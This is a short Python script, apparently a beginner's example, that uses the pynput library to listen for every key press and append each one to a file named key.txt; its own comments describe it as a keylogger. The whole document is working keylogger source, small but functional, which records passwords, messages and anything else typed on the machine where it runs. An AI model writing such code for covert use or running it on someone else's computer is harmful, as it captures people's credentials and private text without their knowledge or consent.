from pynput.keyboard import Listener

def log(key): #Create A Function. It Is Works On Whenever Pressed Keys
    with open("key.txt","a") as f: # Create A "Key.txt" Text File That Is Used To Store Keyloggers.
        f.write(str(key) + "\n") # Change The Key Strokes Into String.
    
with Listener(on_press=log) as l: 
    l.join()